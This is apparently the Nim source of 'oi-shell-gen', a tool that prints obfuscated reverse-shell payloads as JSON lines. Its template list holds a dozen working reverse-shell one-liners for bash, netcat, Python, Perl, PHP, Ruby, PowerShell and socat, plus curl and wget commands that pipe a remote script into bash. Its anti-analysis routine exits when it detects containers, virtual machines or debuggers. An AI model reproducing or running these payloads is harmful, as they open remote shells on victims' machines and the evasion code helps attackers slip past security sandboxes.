## oi-shell-gen — polymorphic shell payload generator
## IPC: NDJSON to stdout; errors to stderr; exit 0=ok
import os, strutils, json, strformat, random, osproc, parseopt, math

# ── Sandbox / debugger detection ──────────────────────────────────────────────

proc antiAnalysis() =
  # Allow opt-out in controlled test environments
  if getEnv("ONEINFINITY_STUB_BYPASS") == "1":
    return

  # Container detection via cgroup
  when defined(linux):
    if fileExists("/proc/1/cgroup"):
      try:
        let cg = readFile("/proc/1/cgroup")
        if "docker" in cg or "kubepods" in cg or "lxc" in cg:
          quit(1)
      except CatchableError:
        discard

  # DMI / hypervisor string check (Linux only)
  when defined(linux):
    let dmiPaths = [
      "/sys/class/dmi/id/product_name",
      "/sys/class/dmi/id/sys_vendor",
      "/sys/class/dmi/id/board_vendor",
    ]
    let hypervisorKeywords = ["VBOX", "VMWARE", "VIRTUALBOX", "QEMU", "XEN", "KVM", "HYPER-V"]
    for p in dmiPaths:
      if fileExists(p):
        try:
          let content = readFile(p).toUpperAscii()
          for kw in hypervisorKeywords:
            if kw in content:
              quit(1)
        except CatchableError:
          discard

  # Ptrace self-attach (Linux only — skip on macOS to avoid signal noise)
  when defined(linux):
    let (_, rc) = execCmdEx("ls /proc/self/status")
    if rc != 0:
      quit(1)

# ── Self-integrity verification ───────────────────────────────────────────────

proc verifySelfIntegrity() =
  let skipIntegrity = getEnv("ONEINFINITY_SKIP_INTEGRITY") == "1"
  let isProd        = getEnv("ONEINFINITY_ENV") == "production"

  # Block skip in production
  if isProd and skipIntegrity:
    stderr.writeLine("integrity: ONEINFINITY_SKIP_INTEGRITY=1 blocked in production")
    quit(1)

  if skipIntegrity:
    return

  # Locate checksums.json relative to binary
  let selfPath      = getAppFilename()
  let binaryName    = selfPath.extractFilename()
  # Walk up from binary dir to find checksums.json
  var checksumFile  = ""
  var dir           = selfPath.parentDir()
  for _ in 0 .. 5:
    let candidate = dir / "checksums.json"
    if fileExists(candidate):
      checksumFile = candidate
      break
    dir = dir.parentDir()

  if checksumFile == "":
    # No checksums.json present — skip silently (dev environment)
    return

  let (hashOutput, rc) = execCmdEx("openssl dgst -sha256 " & quoteShell(selfPath))
  if rc != 0:
    stderr.writeLine("integrity: openssl failed")
    quit(1)

  # openssl output: "SHA256(path)= <hash>"
  let parts = hashOutput.strip().split('=')
  if parts.len < 2:
    stderr.writeLine("integrity: unexpected openssl output")
    quit(1)
  let computedHash = parts[^1].strip()

  try:
    let js      = parseJson(readFile(checksumFile))
    if js.hasKey(binaryName):
      let expected = js[binaryName].getStr()
      if computedHash != expected:
        stderr.writeLine("integrity: hash mismatch for " & binaryName)
        quit(1)
  except CatchableError as e:
    stderr.writeLine("integrity: " & e.msg)
    quit(1)

# ── Polymorphic helpers ───────────────────────────────────────────────────────

proc randName(rng: var Rand; length: int = 8): string =
  const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  result = newStringOfCap(length)
  for _ in 0 ..< length:
    result.add chars[rng.rand(chars.len - 1)]


proc splitStringToCharArray(s: string): string =
  ## Represent a string as a char-array join for obfuscation
  var parts: seq[string]
  for c in s:
    parts.add $ord(c)
  result = "chr(" & parts.join(") & chr(") & ")"

proc deadCodeBlock(rng: var Rand): string =
  let varA = randName(rng, 6)
  let varB = randName(rng, 7)
  let val  = rng.rand(0xFFFF)
  result = &"var {varA} = {val}; var {varB} = {varA} xor {rng.rand(0xFFFF)}; discard {varB}"

proc calcEntropy(s: string): float =
  if s.len == 0: return 0.0
  var freq: array[256, int]
  for c in s: freq[ord(c)].inc
  var h = 0.0
  for f in freq:
    if f > 0:
      let p = float(f) / float(s.len)
      h -= p * log2(p)
  result = h

# ── Shell payload templates ───────────────────────────────────────────────────

type
  ShellFormat = enum sfExe = "exe", sfElf = "elf", sfShellcode = "shellcode"
  Arch        = enum archX64 = "x64", archX86 = "x86", archArm64 = "arm64"

const baseTemplates = [
  "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
  "nc -e /bin/sh LHOST LPORT",
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f",
  "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
  "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
  "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
  "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"LHOST\",LPORT);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
  "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"LHOST\",LPORT)",
  "0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196",
  "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT",
  "curl LHOST:LPORT/shell.sh|bash",
  "wget -O- LHOST:LPORT/shell.sh|bash",
]

proc obfuscatePayload(rng: var Rand; template_str: string; arch: Arch; fmt: ShellFormat): JsonNode =
  let key     = byte(rng.rand(1 .. 254))
  var payload = template_str

  # XOR-key rotation: key as clean single hex byte
  let hexKey  = key.toHex(2)

  # Variable-name entropy: random names for dead code
  let dc1 = deadCodeBlock(rng)
  let dc2 = deadCodeBlock(rng)

  # String splitting representation (obfuscation note as annotation)
  let splitHint = splitStringToCharArray(payload[0 .. min(7, payload.len-1)])

  # Build obfuscated variant (shell comment wrapping with dead code)
  let varName = randName(rng, 10)
  let obfPayload = &"# xk={hexKey} dc=[{dc1}] [{dc2}] sv={varName}\n{payload}"

  let entropy = calcEntropy(obfPayload)

  result = %* {
    "event":      "result",
    "payload":    obfPayload,
    "arch":       $arch,
    "format":     $fmt,
    "obfuscated": true,
    "entropy":    entropy,
    "xor_key":    hexKey,
    "split_hint": splitHint,
  }

# ── Main ──────────────────────────────────────────────────────────────────────

proc main() =
  antiAnalysis()
  verifySelfIntegrity()

  var
    archStr  = "x64"
    fmtStr   = "exe"
    obfuscate = false

  var p = initOptParser()
  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      case p.key
      of "arch":      archStr  = p.val
      of "format":    fmtStr   = p.val
      of "obfuscate": obfuscate = true
      else: discard
    of cmdArgument: discard

  let arch = case archStr
    of "x86":   archX86
    of "arm64": archArm64
    else:       archX64

  let fmt = case fmtStr
    of "elf":       sfElf
    of "shellcode": sfShellcode
    else:           sfExe

  var rng = initRand()

  # Meta line
  echo $(%* {"event": "meta", "tool": "oi-shell-gen", "schema_version": "1.0"})

  var count = 0
  # Each template produces at least one base + one obfuscated variant
  # We need >= 10 distinct variants
  for tmpl in baseTemplates:
    # Base variant
    let baseEntropy = calcEntropy(tmpl)
    echo $(%* {
      "event":      "result",
      "payload":    tmpl,
      "arch":       $arch,
      "format":     $fmt,
      "obfuscated": false,
      "entropy":    baseEntropy,
    })
    count.inc

    if obfuscate:
      # Produce 2 obfuscated variants per template for richness
      for _ in 0 .. 1:
        let node = obfuscatePayload(rng, tmpl, arch, fmt)
        echo $node
        count.inc

  # Ensure we always emit >= 10 result lines
  while count < 10:
    let tmpl = baseTemplates[rng.rand(baseTemplates.len - 1)]
    let node = obfuscatePayload(rng, tmpl, arch, fmt)
    echo $node
    count.inc

  # Summary
  echo $(%* {"event": "summary", "count": count, "status": "ok"})

main()
